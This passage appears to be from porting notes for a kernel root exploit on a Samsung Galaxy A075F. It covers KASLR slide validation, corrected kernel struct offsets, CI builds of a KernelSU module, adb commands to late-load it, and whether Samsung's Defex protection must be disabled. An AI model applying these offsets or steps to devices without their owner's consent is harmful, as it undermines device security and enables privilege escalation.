CONFIG_KPROBES=y  CONFIG_EXT4_FS=y        <- KernelSU Kconfig depends on both
CONFIG_KALLSYMS=y CONFIG_KALLSYMS_ALL=y
CONFIG_CFI_CLANG=y               CONFIG_SHADOW_CALL_STACK=y
CONFIG_ARM64_PTR_AUTH_KERNEL=y   CONFIG_LTO_NONE=y
CONFIG_SECURITY_DEFEX=y  (DEFEX_DTM, DEFEX_IMR_V2, DEFEX_USER)
CONFIG_RELOCATABLE=y  CONFIG_RANDOMIZE_BASE=y  CONFIG_ARM64_VA_BITS_39=y
CONFIG_LOCALVERSION="-4k"  CONFIG_LOCALVERSION_AUTO=y
CONFIG_CC_IS_CLANG=y  clang 19.0.1 (Android r536225)  CONFIG_LD_IS_LLD=y
```

There is **no** `CONFIG_RKP*` and no `CONFIG_KDP*` in this kernel, so the
old `CONFIG_KSU_SAMSUNG_KDP/RKP/DEFEX` patch set does not apply. KernelSU
v3.2.5 (`b0bc817`) is the right baseline instead: it is the first line that
carries `__nocfi` annotations and a `.cfi_jt` symbol resolver (needed because
`CONFIG_CFI_CLANG=y` here) and has an explicit 6.12 code path. Its `Kconfig`
only needs `KPROBES` and `EXT4_FS`, both already `y`.

## 9. Remaining hardware validation

1. Confirm `cat /sys/kernel/tracing/events/sched/sched_blocked_reason/id` on the
   device equals `110` (and `.../sched_waking/id` equals `94`), and that every
   observed kworker caller minus `0x00101ef8` is 64 KiB aligned and inside the
   P0 slide range.
2. Confirm `P0_KERNEL_PHYS_LOAD` on-device — see §4.1. `P0_PHYS_OFFSET` is
   already confirmed from `/proc/zoneinfo` (DMA32 `start_pfn 262144`, Normal
   `start_pfn 1048576`, RAM `0x40000000`–`0x140000000`).
3. Run the release payload and record the resulting artifacts in
   `support/targets-v3.json`.

## 10. Building the KernelSU artifacts

Two files are produced by CI, never by hand:

```text
kernelsu/android16-6.12_kernelsu-A075FXXS5BZD2-kdp.ko   the module
kernelsu/ksud-A075FXXS5BZD2-kdp                          the userspace daemon
```

### 10.1 Why it has to be CI

The sandbox cannot do it: it has no clang, bison, flex or bc, and it cannot
reach `release-assets.githubusercontent.com`, so the 357 MB Samsung opensource
archive on release tag `1` is undownloadable from here. GitHub Actions has
unrestricted network access.

### 10.2 One-time setup (repository variables)

Settings → Secrets and variables → Actions → Variables:

| Variable | Required | Value |
| --- | --- | --- |
| `A075F_KERNEL_SRC_URL` | **yes** | `https://github.com/Muchyutaka/Root-My-GalaxyA075F-Payloads/releases/download/1/SM-A075F_16_Opensource.zip` |
| `A075F_KERNEL_SRC_SHA256` | no | sha256 of the base archive |
| `A075F_KERNEL_SRC_DELTA_URL` | no | `https://github.com/Muchyutaka/Root-My-GalaxyA075F-Payloads/releases/download/1/SM-A075F_16_Opensource_A075FXXS5BZD2_A075MUBS5BZD2_A075FXXS5BZD3.zip` |
| `A075F_KERNEL_SRC_DELTA_SHA256` | no | sha256 of the delta archive |
| `A075F_KSUD_TAG` | no | override the KernelSU tag (default `v3.2.5`) |

The `.config` is **not** an input — the target's own IKCONFIG dump is committed
at `src/targets/a07-A075FXXS5BZD2/kernel.config` (§8.1), so nothing about the
Kconfig has to be guessed.

### 10.3 Triggering the build

Either push a commit whose message contains `[a075f-ksu]`:

```sh
git commit --allow-empty -m "chore(a075f): build kernelsu [a075f-ksu]"
git push origin arena/01a0f70e-root-my-galaxya075f-payloads
```

or run it by hand: Actions → `a075f-kernelsu-build` → Run workflow.

The workflow extracts the archive (layout-agnostic: it locates the `Makefile`
that declares `PATCHLEVEL = 12`, so it does not matter which directory Samsung
wrapped the tree in), overlays the delta if one is configured, applies the
committed `.config`, forces `CONFIG_LOCALVERSION` /
`CONFIG_LOCALVERSION_AUTO` so `utsrelease` is exactly
`6.12.23-android16-5-abA075FXXS5BZD2-4k`, builds Android clang r536225, runs
`modules_prepare`, integrates KernelSU the way its own `kernel/setup.sh` does
(`drivers/kernelsu` symlink + `obj-$(CONFIG_KSU)` in `drivers/Makefile` +
`source "drivers/kernelsu/Kconfig"` before `endmenu`), builds with
`CONFIG_KSU=m`, audits the result, and commits both artifacts back to the
branch.

### 10.4 What the audit checks

```text
vermagic == 6.12.23-android16-5-abA075FXXS5BZD2-4k SMP preempt mod_unload modversions aarch64
modinfo name == kernelsu
ksu_syscall_dispatcher present in the disassembly   (arm64 syscall hook built in)
ksud is an aarch64 ELF and contains late_load support
```

`vermagic` is the one that bites: `CONFIG_MODVERSIONS=y` means the running
kernel rejects the module unless the `__versions` CRCs were produced against
this exact source tree, and `same_magic()` compares the whole string including
the `SMP preempt mod_unload modversions aarch64` tail.

### 10.5 Loading it on device

```sh
adb push kernelsu/android16-6.12_kernelsu-A075FXXS5BZD2-kdp.ko /data/local/tmp/
adb push kernelsu/ksud-A075FXXS5BZD2-kdp /data/local/tmp/
adb shell "su -c true 2>/dev/null; chmod 755 /data/local/tmp/ksud-A075FXXS5BZD2-kdp"
adb shell "/data/local/tmp/ksud-A075FXXS5BZD2-kdp late-load \
  /data/local/tmp/android16-6.12_kernelsu-A075FXXS5BZD2-kdp.ko"
```

`CONFIG_MODULE_SIG_FORCE` is not set in the target config, so the unsigned
module loads (it will taint the kernel, which is expected for a late-load).

### 10.6 Caveat that is still open

`CONFIG_SECURITY_DEFEX=y` is enabled with `DEFEX_DTM`, `DEFEX_IMR_V2` and
`DEFEX_USER`. Defex blocks `su`/`magisk`-style transitions and its IMR v2
integrity check can reject a module that patches kernel text. KernelSU v3.2.5
has no Defex bypass, so the first on-device load may need either
`CONFIG_SECURITY_DEFEX=n` in the target config or a Defex-specific patch. That
cannot be decided from the offline artifacts — it is the first thing to check
when the module loads and `ksud late-load` reports a failure.

## 11. Revision history

### 2026-10-03 — profile corrected and fully re-verified (port-a075f)

- `SLIDE_PSELECT_WORD_SHIFT` corrected `0 -> 2` (section 5.4). The first
  draft copied the 6.6 value; both device-verified 6.12 MT6789 ports
  (ghostlock-a17, ghostlock-emerald) use 2.
- `FOPS_*` first-half layout corrected to the 6.12 BTF layout (section
  6.1). The first draft copied the 6.6 `a36xq` layout
  (`llseek 0x08, read 0x10, write 0x18, read_iter 0x20, write_iter 0x28,
  unlocked_ioctl 0x48, compat_ioctl 0x50, mmap 0x58`); the 6.12 kernel
  has `iterate_shared` at 0x40 and `poll` at 0x48, shifting the first
  half by 0x08.
- `PWQ_NR_ACTIVE_OFF` corrected `0x5c -> 0x60` (section 6.2), the
  BTF-verified 6.12 `nr_active` offset; `PWQ_MAX_ACTIVE_OFF` points at the
  same slot for the `src/root.c` sanity gate because 6.12 removed
  `pool_workqueue.max_active`.
- Every other value in `target.h` was re-verified, value by value, against
  the exact A075FXXS5BZD2 Image by
  `tools/derive_a075f_target.py` in the unified
  `.github/workflows/port-a075f.yml` workflow (asset fetch, kernel
  verification, BTF/symbol/disassembly derivation, payload build with NDK
  r29, KernelSU module + ksud build, artifact publication). The
  separate `a075f-fetch-assets` / `a075f-kernelsu-build` workflows from
  the first draft are superseded by it.
- The kernel release is `6.12.23-android16-5-abA075FXXS5BZD2-4k` for this
  firmware, so the support-feed `kernelVersions` entry is `6.12.23`
  (three-part `uname -r`). The `6.12.38` number that circulates for the
  A07 family belongs to the later `A075FXXS6CZ*` builds (same number as
  the A17 `CZG1` build); a matching payload for those builds needs its
  own profile because the symbol offsets differ.
